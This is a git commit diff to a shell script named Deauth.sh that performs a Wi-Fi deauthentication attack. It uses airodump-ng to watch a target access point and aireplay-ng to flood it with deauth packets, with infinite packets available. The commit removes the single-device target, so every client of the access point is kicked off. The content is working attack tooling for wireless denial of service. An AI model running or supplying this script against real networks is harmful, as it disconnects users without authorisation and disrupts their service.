3b47440b5c2fafe7cdca00c97bde4def4b2d8eba
djb0023 <djb0023@uah.edu>
2016-11-19 17:04:13 -0600

    Update Deauth.sh

--- Scripts/Deauth.sh
+++ Scripts/Deauth.sh
@@ -10,10 +10,7 @@
 	read channelNum
 	xterm -hold -e airodump-ng -c$channelNum --bssid $bssID wlan0 & tput setaf 3; echo "Starting injection...$(tput sgr 0)"
 
-	tput setaf 6;   echo "Enter MAC address of device you wish to kick:$(tput sgr 0)"
-	read deviceID
 	tput setaf 6;   echo "Enter number of deauthentication packets (0 for infinite):$(tput sgr 0)"
 	read deauthPackets
-	aireplay-ng -0 $deauthPackets -a $bssID -c $deviceID wlan0
-
+	aireplay-ng -0 $deauthPackets -a $bssID wlan0
 
